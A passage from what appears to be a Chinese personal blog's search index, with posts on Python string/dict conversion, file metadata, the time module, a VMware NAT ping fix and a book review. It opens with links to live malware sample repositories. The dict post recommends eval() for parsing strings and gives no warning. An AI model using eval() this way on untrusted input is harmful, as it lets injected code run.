href="https://www.secrss.com/articles/2337" target="_blank" rel="noopener">Ember数据集</a></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"><a href="https://thezoo.morirt.com/" target="_blank" rel="noopener">theZoo</a></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"><a href="https://github.com/Endermanch/MalwareDatabase" target="_blank" rel="noopener">Github Malware Database</a></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-字符串-字典与字符串互转</title>
      <link href="/2022/02/28/Python-%E5%AD%97%E7%AC%A6%E4%B8%B2-%E5%AD%97%E5%85%B8%E4%B8%8E%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BA%92%E8%BD%AC/"/>
      <url>/2022/02/28/Python-%E5%AD%97%E7%AC%A6%E4%B8%B2-%E5%AD%97%E5%85%B8%E4%B8%8E%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BA%92%E8%BD%AC/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-字符串转为字典"><a class="markdownIt-Anchor" href="#1-字符串转为字典"></a> 1 字符串转为字典</h1><p>如果要将字符串转为字典，则可以使用 eval，但是原来双引号会变为单引号。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dict_str = <span class="string">"""</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    "key_a": 1,</span></span><br><span class="line"><span class="string">    "key_b": 2,</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">dict_new = eval(dict_str)</span><br><span class="line">print(type(dict_new)) <span class="comment"># &lt;class 'dict'&gt;</span></span><br><span class="line">print(dict_new) <span class="comment"># &#123;'key_a': 1, 'key_b': 2&#125;</span></span><br></pre></td></tr></table></figure><h1 id="2-字典转字符串"><a class="markdownIt-Anchor" href="#2-字典转字符串"></a> 2 字典转字符串</h1><p>将字典转为字符串的方式，可以使用 str，但是原来双引号会变为单引号。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dict_test = &#123;</span><br><span class="line">    <span class="string">"key_a"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">"key_b"</span>: <span class="number">2</span>,</span><br><span class="line">&#125;</span><br><span class="line">dict_str = str(dict_test)</span><br><span class="line">print(type(dict_str)) <span class="comment"># &lt;class 'str'&gt;</span></span><br><span class="line">print(dict_str) <span class="comment"># &#123;'key_a': 1, 'key_b': 2&#125;</span></span><br></pre></td></tr></table></figure><p>使用 json.dumps，就可以保住双引号；如果不用考虑双引号，则使用 str，毕竟比 json.dumps 快了一个数量级。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">dict_test = &#123;</span><br><span class="line">    <span class="string">"key_a"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">"key_b"</span>: <span class="number">2</span>,</span><br><span class="line">&#125;</span><br><span class="line">dict_str = json.dumps(dict_test)</span><br><span class="line">print(type(dict_str)) <span class="comment"># &lt;class 'str'&gt;</span></span><br><span class="line">print(dict_str) <span class="comment"># &#123;"key_a": 1, "key_b": 2&#125;</span></span><br></pre></td></tr></table></figure><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://blog.csdn.net/Kester_/article/details/113132295" target="_blank" rel="noopener">python字典转字符串</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-os模块-获取文件信息</title>
      <link href="/2022/02/28/Python-os%E6%A8%A1%E5%9D%97-%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF/"/>
      <url>/2022/02/28/Python-os%E6%A8%A1%E5%9D%97-%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-获取文件大小创建时间访问时间修改时间"><a class="markdownIt-Anchor" href="#1-获取文件大小创建时间访问时间修改时间"></a> 1 获取文件大小，创建时间，访问时间，修改时间</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="string">'''把时间戳转化为时间: 1479264792 to 2016-11-16 10:53:12'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">TimeStampToTime</span><span class="params">(timestamp)</span>:</span></span><br><span class="line">    timeStruct = time.localtime(timestamp)</span><br><span class="line">    <span class="keyword">return</span> time.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>,timeStruct)</span><br><span class="line"></span><br><span class="line"><span class="string">'''获取文件的大小,结果保留两位小数，单位为MB'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_FileSize</span><span class="params">(filePath)</span>:</span></span><br><span class="line">    filePath = filePath.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    fsize = os.path.getsize(filePath)</span><br><span class="line">    print(fsize, <span class="string">"B"</span>)</span><br><span class="line">    print(fsize/float(<span class="number">1024</span>), <span class="string">"KB"</span>)</span><br><span class="line">    print(fsize/float(<span class="number">1024</span>*<span class="number">1024</span>), <span class="string">"MB"</span>)</span><br><span class="line">    fsize = fsize/float(<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">return</span> round(fsize, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''获取文件的访问时间'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_FileAccessTime</span><span class="params">(filePath)</span>:</span></span><br><span class="line">    filePath = filePath.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    t = os.path.getatime(filePath)</span><br><span class="line">    <span class="keyword">return</span> TimeStampToTime(t)</span><br><span class="line"></span><br><span class="line"><span class="string">'''获取文件的创建时间'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_FileCreateTime</span><span class="params">(filePath)</span>:</span></span><br><span class="line">    filePath = filePath.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    t = os.path.getctime(filePath)</span><br><span class="line">    <span class="keyword">return</span> TimeStampToTime(t)</span><br><span class="line"></span><br><span class="line"><span class="string">'''获取文件的修改时间'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_FileModifyTime</span><span class="params">(filePath)</span>:</span></span><br><span class="line">    filePath = filePath.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    t = os.path.getmtime(filePath)</span><br><span class="line">    <span class="keyword">return</span> TimeStampToTime(t)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    file_path = <span class="string">"test1.py"</span></span><br><span class="line">    print(get_FileSize(file_path))</span><br><span class="line">    print(get_FileAccessTime(file_path))</span><br><span class="line">    print(get_FileCreateTime(file_path))</span><br><span class="line">    print(get_FileModifyTime(file_path))</span><br></pre></td></tr></table></figure><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://www.cnblogs.com/shaosks/p/5614630.html" target="_blank" rel="noopener">python 获取文件大小，创建时间和访问时间</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-time模块-获取当前时间</title>
      <link href="/2022/02/28/Python-time%E6%A8%A1%E5%9D%97-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%97%B6%E9%97%B4/"/>
      <url>/2022/02/28/Python-time%E6%A8%A1%E5%9D%97-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%97%B6%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-timetime"><a class="markdownIt-Anchor" href="#1-timetime"></a> 1 time.time()</h1><ul><li>返回当前时间戳，值为按秒计算的浮点数</li><li>表示从1970年1月1日0点0分开始，到当前时间，一共经历了多少秒</li></ul> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">test_time = time.time()</span><br><span class="line">print(type(test_time))  <span class="comment"># &lt;class 'float'&gt;</span></span><br><span class="line">print(test_time)  <span class="comment"># 1646054545.0786133</span></span><br></pre></td></tr></table></figure><h1 id="2-timelocaltime"><a class="markdownIt-Anchor" href="#2-timelocaltime"></a> 2 time.localtime()</h1><ul><li>格式化时间戳为本地的时间，年月日，时分秒等信息</li><li>若未输入参数，默认当前时间</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">test_time = time.localtime()</span><br><span class="line">print(type(test_time)) <span class="comment"># &lt;class 'time.struct_time'&gt;</span></span><br><span class="line">print(test_time) <span class="comment"># time.struct_time(tm_year=2022, tm_mon=2, tm_mday=28, tm_hour=21, tm_min=29, tm_sec=32, tm_wday=0, tm_yday=59, tm_isdst=0)</span></span><br><span class="line">print(test_time.tm_year) <span class="comment"># 年：2022</span></span><br><span class="line">print(test_time.tm_mon) <span class="comment"># 月：2</span></span><br><span class="line">print(test_time.tm_mday) <span class="comment"># 日：28</span></span><br><span class="line">print(test_time.tm_hour) <span class="comment"># 时：21</span></span><br><span class="line">print(test_time.tm_min) <span class="comment"># 分：29</span></span><br><span class="line">print(test_time.tm_sec) <span class="comment"># 秒：32</span></span><br><span class="line"></span><br><span class="line">t2 = time.time()</span><br><span class="line">print(time.localtime(t2)) <span class="comment"># time.struct_time(tm_year=2022, tm_mon=2, tm_mday=28, tm_hour=21, tm_min=32, tm_sec=44, tm_wday=0, tm_yday=59, tm_isdst=0)</span></span><br></pre></td></tr></table></figure><h1 id="3-timeasctime"><a class="markdownIt-Anchor" href="#3-timeasctime"></a> 3 time.asctime()</h1><ul><li>格式化时间</li><li>若未输入参数，默认当前时间</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">t1 = time.asctime()</span><br><span class="line">print(type(t1)) <span class="comment"># &lt;class 'str'&gt;</span></span><br><span class="line">print(t1) <span class="comment"># Mon Feb 28 21:37:53 2022</span></span><br><span class="line"></span><br><span class="line">t2 = time.localtime(time.time())</span><br><span class="line">print(time.asctime(t2)) <span class="comment"># Mon Feb 28 21:37:53 2022</span></span><br><span class="line"></span><br><span class="line">t3 = time.asctime(time.localtime())</span><br><span class="line">print(t3) <span class="comment"># Mon Feb 28 21:37:53 2022</span></span><br></pre></td></tr></table></figure><h1 id="4-timestrftime"><a class="markdownIt-Anchor" href="#4-timestrftime"></a> 4 time.strftime()</h1><ul><li>格式化时间</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">t1 = time.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>, time.localtime())</span><br><span class="line">print(type(t1)) <span class="comment"># &lt;class 'str'&gt;</span></span><br><span class="line">print(t1) <span class="comment"># 2022-02-28 21:39:55</span></span><br><span class="line"></span><br><span class="line">t2 = time.strftime(<span class="string">'%a %b %d %H:%M:%S %Y'</span>, time.localtime())</span><br><span class="line">print(type(t2)) <span class="comment"># &lt;class 'str'&gt;</span></span><br><span class="line">print(t2) <span class="comment"># Mon Feb 28 21:39:55 2022</span></span><br></pre></td></tr></table></figure><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://blog.csdn.net/qq_36512295/article/details/99694528" target="_blank" rel="noopener">Python获取当前时间（time模块）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>《边城》电影</title>
      <link href="/2022/02/28/%E3%80%8A%E8%BE%B9%E5%9F%8E%E3%80%8B%E7%94%B5%E5%BD%B1/"/>
      <url>/2022/02/28/%E3%80%8A%E8%BE%B9%E5%9F%8E%E3%80%8B%E7%94%B5%E5%BD%B1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-影片信息"><a class="markdownIt-Anchor" href="#1-影片信息"></a> 1 影片信息</h1><ul><li></li></ul><h1 id="2-剧情简介"><a class="markdownIt-Anchor" href="#2-剧情简介"></a> 2 剧情简介</h1><h1 id="3-台词"><a class="markdownIt-Anchor" href="#3-台词"></a> 3 台词</h1><blockquote><p><font color="blue">玻璃花</font>：</p></blockquote><h1 id="4-自评"><a class="markdownIt-Anchor" href="#4-自评"></a> 4 自评</h1><p><a href="https://dragonliu.tk/2022/02/12/%E3%80%8A%E7%A5%9E%E9%9E%AD%E3%80%8B%E4%B9%A6%E7%B1%8D/" target="_blank" rel="noopener">博客——《神鞭》书籍</a></p><h1 id="5-他评"><a class="markdownIt-Anchor" href="#5-他评"></a> 5 他评</h1><blockquote><center>改革开放练就“神鞭”</center><p>本来不</p><p>——   <font color="blue">引自 <a href="https://movie.douban.com/review/10056840/?dt_dapp=1&amp;dt_platform=com.douban.activity.qq_session" target="_blank" rel="noopener">豆瓣 德尔苏 </a></font></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 影视 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
            <tag> 电影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NAT模式下物理机ping不通虚拟机</title>
      <link href="/2022/02/28/NAT%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%89%A9%E7%90%86%E6%9C%BAping%E4%B8%8D%E9%80%9A%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
      <url>/2022/02/28/NAT%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%89%A9%E7%90%86%E6%9C%BAping%E4%B8%8D%E9%80%9A%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-情景描述"><a class="markdownIt-Anchor" href="#1-情景描述"></a> 1 情景描述</h1><ul><li>物理机：Windows10</li><li>虚拟机：Ubuntu20.04 LTS</li><li>网络模式：NAT模式</li><li>物理机IP：192.168.31.108</li><li>虚拟机IP：192.168.10.138</li></ul><p>虚拟机可以Ping通物理机：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ping 192.168.31.108</span><br><span class="line">PING 192.168.31.108 (192.168.31.108) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.31.108: icmp_seq=1 ttl=128 time=0.838 ms</span><br><span class="line">64 bytes from 192.168.31.108: icmp_seq=2 ttl=128 time=0.415 ms</span><br></pre></td></tr></table></figure><p>物理机Ping不通虚拟机：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">E:\01 Blog_work\Hexo-Blog&gt;ping 192.168.10.138</span><br><span class="line"></span><br><span class="line">正在 Ping 192.168.10.138 具有 32 字节的数据:</span><br><span class="line">请求超时。</span><br><span class="line">请求超时。</span><br></pre></td></tr></table></figure><h1 id="2-问题原因"><a class="markdownIt-Anchor" href="#2-问题原因"></a> 2 问题原因</h1><p>VMnet8(<code>192.168.137.1</code>)与虚拟机IP(<code>192.168.10.138</code>)不在一个网段上：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">E:\01 Blog_work\Hexo-Blog&gt;ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line">...</span><br><span class="line">以太网适配器 VMware Network Adapter VMnet8:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::5fb:8fe:8535:fd2%23</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 192.168.137.1</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . :</span><br></pre></td></tr></table></figure><h1 id="3-解决"><a class="markdownIt-Anchor" href="#3-解决"></a> 3 解决</h1><p>修改网卡(<code>VMware Virtual Ethernet Adapter for VMnet8</code>)的配置信息：</p><img src="https://s2.loli.net/2022/02/28/9YzxsWEXkC7ydR1.png" width="800" height="600" alt="图片名称" align="center" id="98"><p>禁用VM8网卡，然后再启用就可以了：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">E:\01 Blog_work\Hexo-Blog&gt;ping 192.168.10.138</span><br><span class="line"></span><br><span class="line">正在 Ping 192.168.10.138 具有 32 字节的数据:</span><br><span class="line">来自 192.168.10.138 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line">来自 192.168.10.138 的回复: 字节=32 时间&lt;1ms TTL=64</span><br></pre></td></tr></table></figure><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://blog.csdn.net/qq_43200143/article/details/113463549" target="_blank" rel="noopener">解决NAT模式下物理机ping不通虚拟机</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>《云边有个小卖部》书籍</title>
      <link href="/2022/02/28/%E3%80%8A%E4%BA%91%E8%BE%B9%E6%9C%89%E4%B8%AA%E5%B0%8F%E5%8D%96%E9%83%A8%E3%80%8B%E4%B9%A6%E7%B1%8D/"/>
      <url>/2022/02/28/%E3%80%8A%E4%BA%91%E8%BE%B9%E6%9C%89%E4%B8%AA%E5%B0%8F%E5%8D%96%E9%83%A8%E3%80%8B%E4%B9%A6%E7%B1%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-简介"><a class="markdownIt-Anchor" href="#1-简介"></a> 1 简介</h1><p>云边镇少年刘十三的成长故事。</p><p>刘十三自幼与开小卖部的外婆相依为命，努力读书为了离开小镇，追寻远方与梦想。在城市里碰壁受挫的刘十三回到了小镇，与少时玩伴程霜重逢。小镇生活平静却暗潮汹涌，一个孤儿，一场婚礼，一场意外，几乎打破了所有人的生活。<br>为了完成一个几乎不可能完成的任务，刘十三拼尽全力，却不知道，生命中更重要的正在离自己而去。<br>———————<br>【名家评论】</p><p>苏童：南方小城镇的少年时代是我曾经熟悉却已远离的过往，嘉佳用极具时代感的语言和生动的画面感，书写了一个充满江南味道的成长故事。离现实很远，离往事很近。作家总会从自己的经验和记忆出发来构建大厦，也是基于此，我愿意相信这个故事的真诚与坦率，我也相信虚构背后的真实，温柔与善良的底色。 故事里的外婆是让我印象最为深刻的人物，相较于爱情，亲情总是容易被忽略却更震撼人心的部分。一些孤独的人拼凑起暂时的圆满，转瞬之间，永远的离别已经到来。无常与幻灭是写作者最钟爱的主题。在一个轻描淡写的时代里，嘉佳的轻，状如云图，嘉佳的淡，有阳光的色泽与气味。</p><p>张大春：通俗的感情难写，再卖力写都有人说你俗。张嘉佳最有意思的是他的脱俗是往俗情里去体会，再透过别有新意的文字，表达出不俗的结果。</p><h1 id="2-作者"><a class="markdownIt-Anchor" href="#2-作者"></a> 2 作者</h1><p>张嘉佳（1980年6月22日－），出生于江苏南通，毕业于南京大学，担任过杂志主笔，电视编导等。中国当代作家、电影编剧和导演。2014年，《从你的全世界路过》出版，在中国大陆销量超过400万册，同年，荣登第九届中国作家富豪榜榜首。因长期在新浪微博中发表“睡前故事”系列微博，被誉为“最会讲故事的人”。</p><ul><li><a href="https://baike.baidu.com/item/%E5%BC%A0%E5%98%89%E4%BD%B3/1716604" target="_blank" rel="noopener">百度百科</a></li><li><a href="https://zh.wikipedia.org/wiki/%E5%BC%A0%E5%98%89%E4%BD%B3" target="_blank" rel="noopener">维基百科</a></li></ul><h1 id="3-摘抄"><a class="markdownIt-Anchor" href="#3-摘抄"></a> 3 摘抄</h1><blockquote><p>满镇开着桔梗，蒲公英飞得比石榴树还高，一直飘进山脚的稻海。在大多数人心中，自己的故乡后来会成为一个点，如同亘古不变的孤岛。</p><hr><p>童年就像童话，<br>这是他们在童话里第一次相遇。<br>那么热的夏天，<br>少年的后背被女孩的悲伤烫出一个洞，<br>一直贯穿到心脏。</p><hr><p>一望无际的稻穗摇摆，像这片土地耀眼的披肩。临道一小块早割的稻田，如同沙发上被烫出的烟洞。</p><p>—— <font color="green">引自 Chapter1 山野，桃树，王莺莺</font></p></blockquote><hr><blockquote><p>刘十三就这样，看着小女孩像梦境一般，马尾辫，眉清目秀，向他走过来。</p><p>毫无疑问，刘十三认为，这场面会铭记一生。</p><p>二〇〇三年的夏天，他们都是四年级。童年就像童话，这是他们在童话里第一次相遇。</p><p>窗外蝉儿鸣叫，屋内扇叶转动，课文朗读声随风去向山林。</p><hr><p>因为有一天，他终于知道，程霜和萤火虫一样，现在是亮的，但说不定下一秒，就是暗的。</p><hr><p>暮风掠过麦浪，远方山巅盖住落日，田边小道听得见蛙鸣。喝醉的小女孩分量不轻，刘十三用力蹬车，骑成了骆驼祥子。</p><hr><p>刘十三没有回应，因为背上一阵湿答答。那么热的夏天，少年的后背被女孩的悲伤烫出一个洞，一直贯穿到心脏，无数个季节的风穿越这条通道，有一只萤火虫在风里飞舞，忽明忽暗。</p><p>—— <font color="green">引自 Chapter2 喂，打劫</font></p></blockquote><hr><blockquote><p>高考分数下来，刘十三收获了他人生最重要的道理：原来世界上很多事情，不是你有计划、有毅力就能做到的。</p><p>—— <font color="green">引自 Chapter3 我在做梦吗</font></p></blockquote><hr><blockquote><p>刘十三独自站在走廊，打开字条，上面很短的几行字：</p><p>喂！<br>这次不算。<br>要是我还能活着，活到再见面，上次说的才算。</p><p>—— <font color="green">引自 Chapter4 不死的少女</font></p></blockquote><hr><blockquote><p>侯经理嘲笑刘十三，努力打击，说明大家依然在同一层次。</p><p>—— <font color="green">引自 Chapter5 城市多少盏灯</font></p></blockquote><hr><blockquote><p>等待而已，<br>也叫努力？<br>是在等别人离开，<br>还是在等自己放弃？</p><p>—— <font color="green">引自 Chapter7 未曾见过的山和海</font></p></blockquote><blockquote><p>越剧演出牛大田终究没看成，秦小贞把戏票给了小姨，但他手舞足蹈，活活烧出一条爱情道路。</p></blockquote><hr><blockquote><p>黄昏中爆出一蓬饱满的烟火，和火烧云连成一片，夹杂着一串一串的流星，射向夜空。腾腾雄起的火焰上方，无数烟花炸开，不讲节奏，不讲道理，噼里啪啦，轰轰烈烈。</p><hr><p>越剧演出牛大田终究没看成，秦小贞把戏票给了小姨，但他手舞足蹈，活活烧出一条爱情道路。</p><p>—— <font color="green">引自 Chapter9 人间火烧云</font></p></blockquote><hr><blockquote><p>“她给你留了东西。”程霜妈妈指着客厅中央挂着的画。</p><p>那幅画刘十三进门第一眼就看到了。</p><p>“最后几天她拼命画，她说，画的名字叫《一缕光》。我不明白这个名字的意思，她说你肯定明白。”</p><p>刘十三当然明白，他站在画前。</p><p>那是幅水粉画，矮矮院墙，桃树下并肩坐着两人。斜斜一缕阳光，花瓣纷飞，女生的头微微靠在男生肩膀上。</p><p>现实中他们没牵手。而画中的女孩，牵着男孩的手，阳光下的幸福美好到看不清。</p><p>画下方，用钢笔写了几行字，字迹娟秀，仿佛透着笑意：</p><p>生命是有光的。<br>在我熄灭以前，能够照亮你一点，就是我所有能做的了。<br>我爱你，你要记得我。</p><p>—— <font color="green">引自 Chapter16 我爱你</font></p></blockquote><h1 id="4-自评"><a class="markdownIt-Anchor" href="#4-自评"></a> 4 自评</h1><p>这是妹妹给我推荐的一本书，说是跟《活着》是一个”风格“的。</p><p>用了一晚上快速读完了一遍，写得很虐，中间有几次落泪，最后的结局也是让人起鸡皮疙瘩。</p><p>对男主很无语，女主那么喜欢他，他竟然始终在想着他的“前女友”（“前女友”压根没有把男主当成男朋友，而是备胎）。</p><p>唯一不足就是脏话太多，前一秒还感动得一塌糊涂，后一秒“去你妈的”啥的，情绪没了一半。</p><p>最后SY说：“可能作者不想让我们哭的太惨 写句脏话缓解一下气氛”</p><h1 id="5-他评"><a class="markdownIt-Anchor" href="#5-他评"></a> 5 